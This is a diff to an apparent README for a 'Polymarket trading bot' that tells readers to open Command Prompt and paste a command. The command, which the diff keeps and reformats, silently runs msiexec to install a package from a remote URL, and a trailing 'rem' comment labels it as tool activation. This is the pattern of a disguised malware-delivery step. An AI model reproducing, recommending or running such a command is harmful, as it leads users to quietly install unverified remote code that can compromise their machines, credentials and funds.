@@ -15,13 +15,11 @@ Keywords: polymarket bot, polymarket trading bot, polymarket automation, predict
 ## Step 1: Open Command Prompt
 Press Win + R, type cmd, and press Enter.
 
-## Step 2: Execute the Command
-
+### Step 2: Execute the Command.
 Copy and paste the command below into Command Prompt.
-
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Polymarket Tool
-
----
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Polymarket Tool Activation
+`````
 
 # Overview
 
